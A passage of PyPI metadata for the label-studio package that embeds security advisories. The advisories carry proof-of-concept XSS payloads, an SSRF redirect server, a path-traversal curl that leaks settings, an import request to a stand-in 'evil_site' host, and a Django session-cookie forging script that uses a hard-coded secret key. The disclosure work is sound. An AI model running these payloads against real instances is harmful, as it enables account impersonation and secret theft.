complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.6.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.6.1/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.16)","rq (==1.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.6.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"340109768c1c97d2bf77f6747528c287ee605ea99866f6e57dcfa933264f5625","md5":"1c111d8a930033525790277f7f82e804","sha256":"4c7c6ed83d48d828cc0af8a4f5e98f6354352690b739df9cfe43151f8d7890b2"},"downloads":-1,"filename":"label_studio-0.6.1-py3-none-any.whl","has_sig":false,"md5_digest":"1c111d8a930033525790277f7f82e804","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6776728,"upload_time":"2020-05-18T15:51:53","upload_time_iso_8601":"2020-05-18T15:51:53.537543Z","url":"https://files.pythonhosted.org/packages/34/01/09768c1c97d2bf77f6747528c287ee605ea99866f6e57dcfa933264f5625/label_studio-0.6.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"4d5339906463aba6af9b9603c9c6c3db5fc2d8243315064969b3ef4a77ae7c40","md5":"dc0c4be93320259326ceb9c05288851a","sha256":"ff2d7fe61557d18648f18f9d4a32ee2c593bd25ee21339b05223221e6e56fd2c"},"downloads":-1,"filename":"label-studio-0.6.1.tar.gz","has_sig":false,"md5_digest":"dc0c4be93320259326ceb9c05288851a","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6709225,"upload_time":"2020-05-18T15:51:57","upload_time_iso_8601":"2020-05-18T15:51:57.563544Z","url":"https://files.pythonhosted.org/packages/4d/53/39906463aba6af9b9603c9c6c3db5fc2d8243315064969b3ef4a77ae7c40/label-studio-0.6.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all 